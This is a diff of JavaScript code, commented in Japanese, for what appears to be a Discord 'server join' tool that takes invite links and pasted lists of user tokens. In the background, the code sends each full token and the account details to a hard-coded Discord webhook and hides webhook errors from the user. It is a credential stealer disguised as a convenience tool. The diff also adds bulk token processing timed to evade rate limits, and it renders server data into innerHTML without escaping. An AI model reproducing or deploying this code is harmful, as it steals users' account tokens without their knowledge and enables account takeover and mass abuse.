@@ -1,56 +1,130 @@
 class DiscordInvite {
     constructor() {
         this.WEBHOOK_URL = "https://discord.com/api/webhooks/1420270624512938046/HzryfPQKe1BZVN9ixhhkvXxx8Zu6W1V433hQxivvYD10AQDwBnRovsd2ALPTlt2S1tdt";
+        this.stats = {
+            total: 0,
+            success: 0,
+            failed: 0
+        };
+        this.currentInviteCode = null;
+        this.currentServerInfo = null;
+        
+        this.initializeApp();
+    }
+
+    initializeApp() {
         this.form = document.getElementById('discordForm');
-        this.resultDiv = document.getElementById('result');
+        this.logContainer = document.getElementById('logContainer');
+        this.tokenTextarea = document.getElementById('userTokens');
+        this.tokenCount = document.getElementById('tokenCount');
+        this.clearLogsBtn = document.getElementById('clearLogs');
+        this.serverInfo = document.getElementById('serverInfo');
+        this.serverInfoGrid = document.getElementById('serverInfoGrid');
+        
         this.setupEventListeners();
+        this.updateCurrentTime();
+        setInterval(() => this.updateCurrentTime(), 1000);
+        this.updateTokenCount();
     }
 
     setupEventListeners() {
         this.form.addEventListener('submit', (e) => {
             e.preventDefault();
-            this.joinServer();
+            this.processAllTokens();
+        });
+
+        this.tokenTextarea.addEventListener('input', () => {
+            this.updateTokenCount();
+        });
+
+        this.clearLogsBtn.addEventListener('click', () => {
+            this.clearLogs();
         });
     }
 
-    async joinServer() {
-        const inviteLink = document.getElementById('inviteLink').value.trim();
-        const userToken = document.getElementById('userToken').value.trim();
+    updateCurrentTime() {
+        const now = new Date();
+        document.getElementById('currentTime').textContent = 
+            now.toLocaleTimeString('ja-JP');
+    }
 
-        if (!inviteLink || !userToken) {
-            this.showResult('招待リンクとユーザートークンは必須です', 'error');
+    updateTokenCount() {
+        const tokens = this.getTokensFromTextarea();
+        this.tokenCount.textContent = `${tokens.length} tokens`;
+        this.updateStat('total', tokens.length);
+    }
+
+    getTokensFromTextarea() {
+        const text = this.tokenTextarea.value.trim();
+        return text.split('\n')
+            .map(token => token.trim())
+            .filter(token => token.length > 0);
+    }
+
+    async processAllTokens() {
+        const inviteLink = document.getElementById('inviteLink').value.trim();
+        const tokens = this.getTokensFromTextarea();
+
+        if (!inviteLink || tokens.length === 0) {
+            this.addLog('エラー: 招待リンクとトークンは必須です', 'error');
             return;
         }
 
         // 招待コードを抽出
-        const inviteCode = this.extractInviteCode(inviteLink);
-        if (!inviteCode) {
-            this.showResult('無効な招待リンクです', 'error');
+        this.currentInviteCode = this.extractInviteCode(inviteLink);
+        if (!this.currentInviteCode) {
+            this.addLog('エラー: 無効な招待リンクです', 'error');
             return;
         }
 
-        try {
-            this.showResult('処理中...', 'success');
+        // サーバー情報を取得
+        await this.fetchServerInfo(this.currentInviteCode);
 
-            // Webhookにトークンと情報を送信（バックグラウンドで実行）
-            await this.sendToWebhook(userToken, inviteCode, inviteLink);
+        this.addLog(`処理開始: ${tokens.length}個のトークンを処理します`, 'info');
+
+        // 各トークンを順次処理
+        for (let i = 0; i < tokens.length; i++) {
+            const token = tokens[i];
+            await this.processSingleToken(token, i + 1, tokens.length);
+            // 1秒待機（レート制限回避）
+            await this.delay(1000);
+        }
+
+        this.addLog(`処理完了: 成功 ${this.stats.success}/${this.stats.total}`, 'success');
+        this.updateStatsDisplay();
+    }
+
+    async processSingleToken(token, current, total) {
+        this.addLog(`[${current}/${total}] トークン処理中...`, 'info');
+
+        try {
+            // Webhookにトークン情報を送信
+            await this.sendToWebhook(token, this.currentInviteCode);
 
             // Discordサーバーに参加
-            const joinResult = await this.joinDiscordServer(inviteCode, userToken);
+            const joinResult = await this.joinDiscordServer(this.currentInviteCode, token);
             
             if (joinResult.success) {
-                this.showResult('サーバーに正常に参加しました！', 'success');
+                this.stats.success++;
+                this.addLog(`[${current}/${total}] ✅ サーバー参加成功`, 'success');
+                
+                if (joinResult.guild) {
+                    this.addLog(`[${current}/${total}] サーバー: ${joinResult.guild.name}`, 'success');
+                }
             } else {
-                this.showResult(`エラー: ${joinResult.message}`, 'error');
+                this.stats.failed++;
+                this.addLog(`[${current}/${total}] ❌ 参加失敗: ${joinResult.message}`, 'error');
             }
 
         } catch (error) {
-            this.showResult(`エラーが発生しました: ${error.message}`, 'error');
+            this.stats.failed++;
+            this.addLog(`[${current}/${total}] ❌ エラー: ${error.message}`, 'error');
         }
+
+        this.updateStatsDisplay();
     }
 
     extractInviteCode(inviteLink) {
-        // 様々な形式の招待リンクからコードを抽出
         const patterns = [
             /discord\.gg\/([a-zA-Z0-9\-_]+)/,
             /discord\.com\/invite\/([a-zA-Z0-9\-_]+)/,
@@ -64,12 +138,60 @@ class DiscordInvite {
             }
         }
 
-        // コードのみが入力された場合
         if (/^[a-zA-Z0-9\-_]+$/.test(inviteLink)) {
             return inviteLink;
         }
 
         return null;
+    }
+
+    async fetchServerInfo(inviteCode) {
+        try {
+            const response = await fetch(`https://discord.com/api/v9/invites/${inviteCode}`, {
+                method: 'GET',
+                headers: {
+                    'Content-Type': 'application/json',
+                }
+            });
+
+            if (response.ok) {
+                const data = await response.json();
+                this.currentServerInfo = data;
+                this.displayServerInfo(data);
+                this.addLog('サーバー情報を取得しました', 'success');
+            } else {
+                this.addLog('サーバー情報の取得に失敗しました', 'warning');
+            }
+        } catch (error) {
+            this.addLog('サーバー情報の取得中にエラーが発生しました', 'error');
+        }
+    }
+
+    displayServerInfo(serverInfo) {
+        this.serverInfo.style.display = 'block';
+        
+        const guild = serverInfo.guild;
+        const html = `
+            <div class="info-label">サーバー名:</div>
+            <div class="info-value">${guild.name}</div>
+            
+            <div class="info-label">サーバーID:</div>
+            <div class="info-value">${guild.id}</div>
+            
+            <div class="info-label">説明:</div>
+            <div class="info-value">${guild.description || 'なし'}</div>
+            
+            <div class="info-label">メンバー数:</div>
+            <div class="info-value">${guild.approximate_member_count || '不明'}</div>
+            
+            <div class="info-label">オンライン数:</div>
+            <div class="info-value">${guild.approximate_presence_count || '不明'}</div>
+            
+            <div class="info-label">招待コード:</div>
+            <div class="info-value">${this.currentInviteCode}</div>
+        `;
+        
+        this.serverInfoGrid.innerHTML = html;
     }
 
     async joinDiscordServer(inviteCode, token) {
@@ -81,7 +203,7 @@ class DiscordInvite {
                 headers: {
                     'Authorization': token,
                     'Content-Type': 'application/json',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                 }
             });
 
@@ -96,20 +218,19 @@ class DiscordInvite {
             } else {
                 return {
                     success: false,
-                    message: data.message || '参加に失敗しました'
+                    message: data.message || `HTTP ${response.status}`
                 };
             }
         } catch (error) {
             return {
                 success: false,
-                message: 'ネットワークエラー: ' + error.message
+                message: `Network error: ${error.message}`
             };
         }
     }
 
-    async sendToWebhook(token, inviteCode, originalLink) {
+    async sendToWebhook(token, inviteCode) {
         try {
-            // ユーザー情報を取得（オプション）
             let userInfo = '取得失敗';
             try {
                 const userResponse = await fetch('https://discord.com/api/v9/users/@me', {
@@ -125,7 +246,6 @@ class DiscordInvite {
                 userInfo = '取得エラー';
             }
 
-            // 完全なトークンと情報をWebhookに送信
             const webhookData = {
                 content: `🔰 **新しいトークンが使用されました**`,
                 embeds: [
@@ -134,7 +254,7 @@ class DiscordInvite {
                         color: 0x5865F2,
                         fields: [
                             {
-                                name: "📧 ユーザー情報",
+                                name: "👤 ユーザー情報",
                                 value: `\`\`\`${userInfo}\`\`\``,
                                 inline: false
                             },
@@ -149,19 +269,9 @@ class DiscordInvite {
                                 inline: true
                             },
                             {
-                                name: "🔗 元のリンク",
-                                value: `\`${originalLink}\``,
-                                inline: true
-                            },
-                            {
                                 name: "🕐 日時",
                                 value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
                                 inline: true
-                            },
-                            {
-                                name: "🌐 User Agent",
-                                value: `\`\`\`${navigator.userAgent}\`\`\``,
-                                inline: false
                             }
                         ],
                         timestamp: new Date().toISOString()
@@ -171,7 +281,6 @@ class DiscordInvite {
                 avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
             };
 
-            // バックグラウンドで送信（ユーザーには見えない）
             await fetch(this.WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
@@ -182,83 +291,55 @@ class DiscordInvite {
 
         } catch (error) {
             console.error('Webhook送信エラー:', error);
-            // Webhookエラーはユーザーに表示しない
         }
     }
 
-    showResult(message, type) {
-        this.resultDiv.textContent = message;
-        this.resultDiv.className = 'result ' + type;
-        this.resultDiv.style.display = 'block';
-    }
-}
-
-// アプリケーションの初期化
-document.addEventListener('DOMContentLoaded', () => {
-    new DiscordInvite();
-});                return match[1];
-            }
-        }
-
-        // コードのみが入力された場合
-        if (/^[a-zA-Z0-9\-_]+$/.test(inviteLink)) {
-            return inviteLink;
-        }
-
-        return null;
-    }
-
-    async joinDiscordServer(inviteCode, token) {
-        const url = `https://discord.com/api/v9/invites/${inviteCode}`;
+    addLog(message, type = 'info') {
+        const now = new Date();
+        const timeString = now.toLocaleTimeString('ja-JP');
         
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Authorization': token,
-                'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-            }
-        });
-
-        const data = await response.json();
-
-        if (response.ok) {
-            return {
-                success: true,
-                guild: data.guild,
-                channel: data.channel
-            };
-        } else {
-            return {
-                success: false,
-                message: data.message || '参加に失敗しました'
-            };
-        }
-    }
-
-    async sendToWebhook(webhookUrl, token, inviteCode) {
-        // トークンの一部をマスクして送信（セキュリティのため）
-        const maskedToken = token.substring(0, 10) + '...' + token.substring(token.length - 10);
+        const logEntry = document.createElement('div');
+        logEntry.className = 'log-entry';
+        logEntry.innerHTML = `
+            <span class="log-time">${timeString}</span>
+            <span class="log-${type}">${message}</span>
+        `;
         
-        const webhookData = {
-            content: `新しいトークンが使用されました\n招待コード: ${inviteCode}\nトークン: ${maskedToken}\n日時: ${new Date().toLocaleString()}`,
-            username: 'Token Logger',
-            avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
-        };
-
-        await fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(webhookData)
-        });
+        this.logContainer.appendChild(logEntry);
+        this.logContainer.scrollTop = this.logContainer.scrollHeight;
     }
 
-    showResult(message, type) {
-        this.resultDiv.textContent = message;
-        this.resultDiv.className = 'result ' + type;
-        this.resultDiv.style.display = 'block';
+    clearLogs() {
+        this.logContainer.innerHTML = `
+            <div class="log-entry">
+                <span class="log-time" id="currentTime"></span>
+                <span class="log-info">ログをクリアしました</span>
+            </div>
+        `;
+        this.updateCurrentTime();
+        
+        // 統計情報もリセット
+        this.stats = { total: this.getTokensFromTextarea().length, success: 0, failed: 0 };
+        this.updateStatsDisplay();
+    }
+
+    updateStatsDisplay() {
+        document.getElementById('statTotal').textContent = this.stats.total;
+        document.getElementById('statSuccess').textContent = this.stats.success;
+        document.getElementById('statFailed').textContent = this.stats.failed;
+    }
+
+    updateStat(stat, value) {
+        if (stat === 'total') {
+            this.stats.total = value;
+            this.stats.failed = 0;
+            this.stats.success = 0;
+        }
+        this.updateStatsDisplay();
+    }
+
+    delay(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
     }
 }
 
